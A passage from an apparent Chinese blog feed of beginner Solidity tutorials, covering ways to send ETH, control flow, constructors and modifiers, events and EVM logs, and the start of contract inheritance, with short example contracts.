alt="image-20250204172327987"></p><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172500152.png" alt="image-20250204172500152"></p><h4 id="Send用法">Send用法</h4><p>用法是<code>接收方地址.send(发送ETH数额)</code>。</p><ul><li><code>send()</code>的<code>gas</code>限制是<code>2300</code>，足够用于转账，但对方合约的<code>fallback()</code>或<code>receive()</code>函数不能实现太复杂的逻辑。</li><li><code>send()</code>如果转账失败，不会<code>revert</code>。</li><li><code>send()</code>的返回值是<code>bool</code>，代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line"></span><br><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172829438.png" alt="image-20250204172829438"></p><h4 id="Call用法-提倡使用">Call用法(提倡使用)</h4><p>用法是<code>接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</code>。</p><ul><li><code>call()</code>没有<code>gas</code>限制，可以支持对方合约<code>fallback()</code>或<code>receive()</code>函数实现复杂逻辑。</li><li><code>call()</code>如果转账失败，不会<code>revert</code>。</li><li><code>call()</code>的返回值是<code>(bool, bytes)</code>，其中<code>bool</code>代表着转账成功或失败，需要额外代码处理一下。</li></ul><p>代码样例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error CallFailed(); // 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署<code>SendETH</code>合约后，对<code>ReceiveETH</code>合约发送ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165726035.png" alt="image-20250204165726035"></p><p><code>ReceiveETH</code>合约成功接收到转账的ETH。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165840188.png" alt="image-20250204165840188"></p><p><code>amount</code>&gt;<code>value</code>，转账失败，发生<code>revert</code>。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204170920553.png" alt="image-20250204170920553"></p><h4 id="总结">总结</h4><p>这一讲，我们介绍<code>Solidity</code>三种发送<code>ETH</code>的方法：<code>transfer</code>，<code>send</code>和<code>call</code>。</p><ul><li>**<code>call</code>没有<code>gas</code>限制，最为灵活，是最提倡的方法！！！**⚠️⚠️⚠️</li><li><code>transfer</code>有<code>2300 gas</code>限制，但是发送失败会自动<code>revert</code>交易，是次优选择；</li><li><code>send</code>有<code>2300 gas</code>限制，而且发送失败不会自动<code>revert</code>交易，几乎没有人用它。</li></ul><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/zh/course/solidity102/Fallback">https://www.wtf.academy/zh/course/solidity102/Fallback</a></p><p><a href="https://www.wtf.academy/zh/course/solidity102/SendETH">https://www.wtf.academy/zh/course/solidity102/SendETH</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity入门学习(二)</title>
      <link href="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
      <url>/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="控制流">控制流</h2><p>这一讲，我们将介绍<code>Solidity</code>中的控制流。</p><p>测试代码<code>Control.sol</code>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Controlflow &#123;</span><br><span class="line">    // if else</span><br><span class="line">    function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">        if(_number == 0)&#123;</span><br><span class="line">            return(true);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return(false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for loop</span><br><span class="line">    function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // while</span><br><span class="line">    function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        while(i &lt; 10)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // do-while</span><br><span class="line">    function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        do&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;while(i &lt; 10);</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 三元运算符 ternary/conditional operator</span><br><span class="line">    function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">        // return the max of x and y</span><br><span class="line">        return x &gt;= y ? x: y; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意⚠️</strong>：<code>Solidity</code>中最常用的变量类型是<code>uint</code>，也就是正整数，取到负值的话，会报<code>underflow</code>错误。</p><h3 id="控制流-2">控制流</h3><p><code>Solidity</code>的控制流与其他语言类似，主要包含以下几种：</p><ol><li>if-else</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">    if(_number == 0)&#123;</span><br><span class="line">        return(true);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>for循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    while(i &lt; 10)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>do-while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;while(i &lt; 10);</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>三目运算</li></ol><p>三元运算符是<code>Solidity</code>中唯一一个接受三个操作数的运算符，规则<code>条件? 条件为真的表达式:条件为假的表达式</code>。此运算符经常用作<code>if</code>语句的快捷方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 三元运算符 ternary/conditional operator</span><br><span class="line">function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">    // return the max of x and y</span><br><span class="line">    return x &gt;= y ? x: y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>另外还有<code>continue</code>（立即进入下一个循环）和<code>break</code>（跳出当前循环）关键字可以使用。</strong></p><h2 id="构造函数和修饰器">构造函数和修饰器</h2><p>这一讲，我们将用合约权限控制（<code>Ownable</code>）的例子介绍<code>Solidity</code>语言中构造函数（<code>constructor</code>）和独有的修饰器（<code>modifier</code>）。测试代码<code>Owner.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Owner &#123;</span><br><span class="line">    //定义owner变量</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    //构造函数</span><br><span class="line">    constructor(address initialOwner)&#123;</span><br><span class="line">        //在部署合约时，将owner设置为initialOwner</span><br><span class="line">        owner = initialOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        //检查地址是否为owner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //如果是的话，继续运行函数主体，否则报错并revert交易</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //只有owner能运行这个函数</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数">构造函数</h3><p>构造函数（<code>constructor</code>）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的<code>owner</code>地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address owner; // 定义owner变量</span><br><span class="line">// 构造函数</span><br><span class="line">constructor(address initialOwner) &#123;</span><br><span class="line">    owner = initialOwner; // 在部署合约的时候，将owner设置为传入的initialOwner地址</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：构造函数在不同的Solidity版本中的语法并不一致，在<strong>Solidity 0.4.22之前</strong>，构造函数不使用 <code>constructor</code> 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 <code>Parents</code>，构造函数名写成 <code>parents</code>），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 <code>constructor</code> 写法。</p><p>构造函数的旧写法代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =0.4.21;</span><br><span class="line">contract Parents &#123;</span><br><span class="line">    // 与合约名Parents同名的函数就是构造函数</span><br><span class="line">    function Parents () public &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修饰器">修饰器</h3><p>修饰器（<code>modifier</code>）是<code>Solidity</code>特有的语法，类似于面向对象编程中的装饰器（<code>decorator</code>），声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。<code>modifier</code>的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><p>我们来定义一个叫做onlyOwner的modifier：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">        //检查地址是否为owner</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        //如果是的话，继续运行函数主体，否则报错并revert交易</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>带有<code>onlyOwner</code>修饰符的函数只能被<code>owner</code>地址调用，比如下面这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//定义一个带有onlyOwner修饰符的函数</span><br><span class="line">    function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">        //只有owner能运行这个函数，并改变owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>changeOwner</code>函数，运行它可以改变合约的<code>owner</code>，但是由于<code>onlyOwner</code>修饰符的存在，只有原先的<code>owner</code>可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="运行测试">运行测试</h3><p>首先是部署代码，传递一个需要初始化的<code>owner</code>，初始化<code>owner</code>为<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150027700.png" alt="image-20250126150027700"></p><p>使用另一个用户<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>，去调用合约，并尝试修改<code>owner</code>。<code>owner</code>修改失败！</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150311002.png" alt="image-20250126150311002"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150255810.png" alt="image-20250126150255810"></p><p>尝试使用部署时输入的账户``0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`。</p><p>去改变<code>owner</code>为<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>，<code>owner</code>修改成功！</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150540552.png" alt="image-20250126150540552"></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126150740601.png" alt="image-20250126150740601"></p><h2 id="事件">事件</h2><p>这一讲，我们用转账ERC20代币为例来介绍<code>Solidity</code>中的事件（<code>event</code>）。</p><p>测试代码<code>Events.sol</code>,代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Events&#123;</span><br><span class="line">    //定义_balances映射变量，记录每个地址的比特币数量</span><br><span class="line">    mapping(address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    //定义Transfer event，记录transfer交易的转账地址，接收地址和转账数量。</span><br><span class="line">    event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line"></span><br><span class="line">    //定义_transfer函数，执行转账逻辑</span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external &#123;</span><br><span class="line">        //给转账地址一些初始代币</span><br><span class="line">        _balances[from] = 10000000;</span><br><span class="line"></span><br><span class="line">        //from地址减去转账数量</span><br><span class="line">        _balances[from] -= amount;</span><br><span class="line">        //to地址加上转账数量</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line"></span><br><span class="line">        //释放事件</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件-2">事件</h3><p><code>Solidity</code>中的事件（<code>event</code>）是<code>EVM</code>上日志的抽象，它具有两个特点：</p><ul><li>响应：应用程序（<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ethers.js</code></a>）可以通过<code>RPC</code>接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<code>EVM</code>上比较经济的存储数据的方式，每个大概消耗2,000 <code>gas</code>；相比之下，链上存储一个新变量至少需要20,000 <code>gas</code>。</li></ul><h3 id="声明事件">声明事件</h3><p>事件的声明由<code>event</code>关键字开头，接着是事件名称，括号里面写好事件需要记录的变量类型和变量名。</p><p>以<code>ERC20</code>代币合约的<code>Transfer</code>事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Transfer</code>事件共记录了3个变量<code>from</code>，<code>to</code>和<code>value</code>，分别对应代币的转账地址，接收地址和转账数量，其中<code>from</code>和<code>to</code>前面带有<code>indexed</code>关键字，他们会保存在以太坊虚拟机日志的<code>topics</code>中，方便之后检索。</p><h3 id="释放事件">释放事件</h3><p>我们可以在函数里释放事件。在下面的例子中，每次用<code>_transfer()</code>函数进行转账操作的时候，都会释放<code>Transfer</code>事件，并记录相应的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 定义_transfer函数，执行转账逻辑</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external &#123;</span><br><span class="line"></span><br><span class="line">    _balances[from] = 10000000; // 给转账地址一些初始代币</span><br><span class="line"></span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line"></span><br><span class="line">    // 释放事件</span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EVM日志-Log">EVM日志(Log)</h3><p>以太坊虚拟机（EVM）用日志<code>Log</code>来存储<code>Solidity</code>事件，每条日志记录都包含主题<code>topics</code>和数据<code>data</code>两部分。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126183129690.png" alt="image-20250126183129690"></p><h3 id="主题-Topics">主题(Topics)</h3><p>日志的第一部分是主题数组，用于描述事件，长度不能超过<code>4</code>。它的第一个元素是事件的签名（哈希）。</p><p>对于上面的<code>Transfer</code>事件，它的事件哈希就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,uint256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure><p>除了事件哈希，主题还可以包含至多<code>3</code>个<code>indexed</code>参数，也就是<code>Transfer</code>事件中的<code>from</code>和<code>to</code>。</p><p><code>indexed</code>标记的参数可以理解为检索事件的索引“键”，方便之后搜索。每个 <code>indexed</code> 参数的大小为固定的256比特，如果参数太大了（比如字符串），就会自动计算哈希存储在主题中。</p><p>这里其实会引入一个新的问题，根据Solidity的<a href="https://docs.soliditylang.org/en/v0.8.27/abi-spec.html#encoding-of-indexed-event-parameters">官方文档</a>, 对于非值类型的参数（如arrays, bytes, strings）, Solidity不会直接存储，而是会将<code>Keccak-256</code>哈希存储在主题中，从而导致数据信息的丢失。这对于某些依赖于链上事件的DAPP（跨链，用户注册等等）来说，可能会导致事件检索困难，需要解析哈希值。</p><h3 id="数据-Data">数据(Data)</h3><p>事件中不带 <code>indexed</code>的参数会被存储在 <code>data</code> 部分中，可以理解为事件的&quot;值&quot;。<code>data</code> 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 <code>data</code> 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 <code>topics</code> 部分中，也是以哈希的方式存储。另外，<code>data</code> 部分的变量在存储上消耗的gas相比于 <code>topics</code> 更少。</p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126185114449.png" alt="image-20250126185114449"></p><p><code>Topics</code>里面有三个元素，第一个是这个事件的哈希，第二和三是我们定义的两个<code>indexed</code>变量的信息，即转账的转出地址和接收地址。<code>Data</code>里面是剩下的不带<code>indexed</code>的变量，也就是转账数量。可以在上图看到<code>Data</code>部分为<code>0x32</code>，50的16进制。</p><h2 id="继承">继承</h2><p>这一讲，我们介绍<code>Solidity</code>中的继承（<code>inheritance</code>），包括简单继承，多重继承，以及修饰器（<code>Modifier</code>）和构造函数（<code>Constructor</code>）的继承。</p><h3 id="继承-2">继承</h3><p>继承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话，<code>Solidity</code>也是面向对象的编程，也支持继承。</p><h3 id="规则">规则</h3><ul><li><code>virtual</code>: 父合约中的函数，如果<strong>希望子合约重写，需要加上<code>virtual</code>关键字。</strong></li><li><code>override</code>：<strong>子合约重写了父合约中的函数，需要加上<code>override</code>关键字</strong>。</li></ul><p><strong>注意</strong>：用<code>override</code>修饰<code>public</code>变量，会重写与变量同名的<code>getter</code>函数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(address =&gt; uint256) public override balanceOf;</span><br></pre></td></tr></table></figure><h3 id="简单继承">简单继承</h3><p>我们先写一个简单的爷爷合约<code>Yeye</code>，里面包含1个<code>Log</code>事件和3个<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>，输出都是”Yeye”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), yeye()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再定义一个爸爸合约<code>Baba</code>，让他继承<code>Yeye</code>合约，语法就是<code>contract Baba is Yeye</code>，非常直观。在<code>Baba</code>合约里，我们重写一下<code>hip()</code>和<code>pop()</code>这两个函数，加上<code>override</code>关键字，并将他们的输出改为<code>”Baba”</code>；并且加一个新的函数<code>baba</code>，输出也是<code>”Baba”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的测试代码<code>Yeye.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 